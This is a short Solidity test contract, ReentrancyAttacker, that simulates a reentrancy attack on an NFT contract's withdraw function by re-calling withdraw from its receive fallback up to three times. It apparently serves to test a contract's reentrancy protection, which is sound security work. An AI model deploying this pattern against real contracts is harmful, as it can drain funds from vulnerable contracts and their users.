// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

interface INFTContract {
    function withdraw() external;
}

/**
 * @title ReentrancyAttacker
 * @dev Test contract to simulate reentrancy attack on withdraw function
 */
contract ReentrancyAttacker {
    INFTContract public nft;
    uint256 public attackCount;
    
    constructor(address _nft) {
        nft = INFTContract(_nft);
    }
    
    function attack() external {
        attackCount = 0;
        nft.withdraw();
    }
    
    receive() external payable {
        attackCount++;
        if (attackCount < 3 && address(nft).balance > 0) {
            nft.withdraw(); // Attempt reentrancy
        }
    }
}
